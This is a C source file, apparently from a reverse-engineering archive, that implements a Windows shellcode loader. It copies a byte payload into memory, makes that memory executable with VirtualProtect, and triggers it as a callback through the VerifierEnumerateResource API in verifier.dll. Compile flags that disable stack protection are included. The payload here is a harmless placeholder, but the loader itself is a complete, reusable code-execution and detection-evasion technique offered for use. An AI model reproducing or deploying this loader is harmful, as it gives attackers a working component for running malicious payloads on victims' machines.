/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - permission: VirtualProtect
    - execution:  VerifierEnumerateResource
*/

#include <windows.h>
#include <stdint.h>
#include <avrfsdk.h>

typedef ULONG VerifierEnumerateResource_t (
    HANDLE  process,
    ULONG   flags,
    ULONG   restype,
    AVRF_RESOURCE_ENUMERATE_CALLBACK callback,
    PVOID   context
);
typedef VerifierEnumerateResource_t FAR * pVerifierEnumerateResource;

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HMODULE lib;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // load verifier.dll into process and get the address to VerifierEnumerateResource()
        lib = LoadLibrary("verifier.dll");
        pVerifierEnumerateResource VerifierEnumerateResource;
        VerifierEnumerateResource = (pVerifierEnumerateResource) GetProcAddress(lib, "VerifierEnumerateResource");
        
        // trigger the execution of shellcode by invoking API
        if (VerifierEnumerateResource)
            VerifierEnumerateResource (GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)runtime, NULL);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}